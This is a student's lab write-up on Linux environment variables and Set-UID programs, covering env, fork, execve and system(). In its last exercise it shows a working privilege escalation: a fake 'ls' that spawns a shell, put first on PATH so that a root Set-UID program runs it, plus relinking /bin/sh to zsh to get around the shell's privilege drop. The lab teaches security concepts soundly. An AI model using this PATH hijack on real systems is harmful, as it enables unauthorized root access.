# Lab 6: Environment Variable and Set-UID Program Lab

Objective: impart an understanding how environment variables influence program and system behaviors. The lab aims to elucidate the mechanisms through which environment variables affect program behaviors, enhancing students' comprehension and enabling them to develop more secure and robust software systems.

## Exercise 1: Manipulating Environment Variables

Manipulating Environment Variables

Command to print out the environment variables:
```bash
env
```
![env](/Lab6/exercise1/img/1.png)


Command to printing out some particular environment variables:
```bash
env | grep PWD
```
![part env](/Lab6/exercise1/img/2.png)

Setting  enviroment variables:
```bash
export MYVAR='Yachay'
env | grep MYVAR
```
Unsetting enviroment variables:
```bash
unset MYVAR
env | grep MYVAR
```
![set unset env](/Lab6/exercise1/img/3.png)


## Exercise 2: Passing Environment Variables from Parent Process to Child Process

**Step 1** 

Compiling `/Lab6/exercise2/myprintenv.c` and saving **child process** info on `/Lab6/exercise2/child`

![child](/Lab6/exercise2/img/1.png)

**Step 2** 

Changing:
```c
  switch(childPid = fork()) {
    case 0:  /* child process */
      printenv();          
      exit(0);
    default:  /* parent process */
      // printenv();       
      exit(0);
```
for:
```c
  switch(childPid = fork()) {
    case 0:  /* child process */
      // printenv();          
      exit(0);
    default:  /* parent process */
      printenv();       
      exit(0);
```

Compiling `/Lab6/exercise2/myprintenv.c` and saving **parent process** info on `/Lab6/exercise2/parent`

![child](/Lab6/exercise2/img/2.png)

**Step 3** 

Comparing the difference of these two files using:

```bash
diff child parent
```
![diff](/Lab6/exercise2/img/3.png)

We can observe that the files are the same, indicating that the environment variables are identical for both the parent process and the child process.

It is important to note that if we use a different name for the executable file when compiling **Step 2**, we will observe differences when executing **Step 3** on the last line `_=./a.out`. However, this differences is solely  the name of the executable file. 

## Exercise 3: Environment Variables and `execve()`

**Step 1*

Compiling `/Lab6/exercise2/myenv.c` on `/Lab6/exercise2/myenv`:

![execve](/Lab6/exercise3/img/1.png)

**Step 2**

Compiling `/Lab6/exercise2/myenv.c` on `/Lab6/exercise2/myenv1` but changing:
```c
  execve("/usr/bin/env", argv, NULL);  
```
for:
```c
execve("/usr/bin/env", argv, environ);
```
![execve](/Lab6/exercise3/img/2.png)

**Step 3** Observations:

By passing the environ variable as the third argument to the execve function instead of **NULL**, as done in **Step 1**, the child process **inherits** the environment variables from the parent process. This implies that any modifications made to the environment variables in the parent process would be reflected in the child process as well.

When environment variables are inherited from the parent process to the child process, it introduces a potential attack surface for malicious actors. If sensitive information such as passwords or other credentials are stored in environment variables within the parent process, these could be inadvertently leaked to the child process and potentially accessed by unauthorized entities.

## Exercise 4: Environment Variables and `system()`

In this task, we study how environment variables are affected when a new program is executed via  the `system()` function. This function is used to execute a command, but unlike `execve()`, which directly execute a command, `system()` actually executes "`/bin/sh -c command`", i.e., it executes `/bin/sh`, and asks the shell to execute the command.

The implementation of the `system()` function its on `/Lab6/exercise4/system_env.c`.

![system](/Lab6/exercise4/img/1.png)

## Exercise 5: Environment Variable and `Set-UID` Programs

**Step 1**

Generate `/Lab6/exercise5/setuid.c` file.

```c
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
}
}
```
**Step 2**

Compiling `setuid.c` on `/Lab6/exercise5/foo`, changing its ownership to root, and makeing it a Set-UID program.
```bash
sudo chown root foo
sudo chmod 4755 foo
```
![uid](/Lab6/exercise5/img/1.png)

**Step 3**

Cheking some environment variables:
![uid](/Lab6/exercise5/img/2.png)

Using **Step 2** executable to chek the environment variables:
![uid](/Lab6/exercise5/img/3.png)

When a Set-UID program is executed, it runs with the permissions of the program's owner (in this case, root), rather than the user who executed it (seed). Despite this change in user identity, the environment variables are still inherited from the parent process (seed) instead of using root environment variables.

## Exercise 6:  The PATH Environment Variable and `Set-UID` Programs

We compile `/Lab6/exercise6/pathuid.c` on `/Lab6/exercise6/puid`, change its owner to root, and make it a Set-UID program.

![lsuid](/Lab6/exercise6/img/1.png)

We can get this Set-UID program to run our own malicious code. Instead of /bin/ls we can run the bash with root privilege.

**Set up**

First we need a new script `/Lab6/exercise6/ls` that will contain our malicious code, this code will be compiled from `/Lab6/exercise6/exploit.c`

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	printf("Malicious ls program is called\n");
	system("/bin/zsh");
	return 0;
}
```

Next, we need to add our path to our current environment variables using:

```bash
export PATH=<Path where our ls script is>:$PATH
```

Since we are working on ubuntu 20.04 we need to change our default bash:
```bash
sudo ln -sf /bin/zsh /bin/sh
```

Now we just execute our `/Lab6/exercise6/puid` file (that calls our ls script) and we can get into the bash with root privileges.

![lsuid](/Lab6/exercise6/img/2.png)